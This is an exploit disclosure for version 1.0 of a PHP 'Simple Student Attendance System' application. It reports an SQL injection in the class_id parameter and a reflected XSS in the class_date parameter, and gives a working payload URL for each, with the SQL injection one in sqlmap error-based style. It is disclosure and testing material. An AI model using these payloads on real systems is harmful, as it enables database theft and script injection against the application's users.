### Exploit Title: Simple Student Attendance System - Multiple vulnerabilities
### Date: 2024-02/23
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./?page=attendance（SQL injections）
/?page=attendance SQL injection exists for parameter class_id

### Sample request POC #1

```
http://localhost:8889/?page=attendance&class_id=1%27%20AND%20GTID_SUBSET(CONCAT(0x7170707a71,(SELECT%20(ELT(5168=5168,1))),0x71706a7871),5168)%20AND%20%27rlSy%27=%27rlSy&class_date=2024-02-23
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708681814551.jpg "Simple Student Attendance System")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708681843042.jpg "Simple Student Attendance System")


# 2./?page=attendance（XSS）
/?page=attendance XSS exists for parameter class_date

### Sample request POC #2

```
http://localhost:8889/?page=attendance&class_id=1&class_date=2024-02-23%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708682117907.jpg "Simple Student Attendance System")


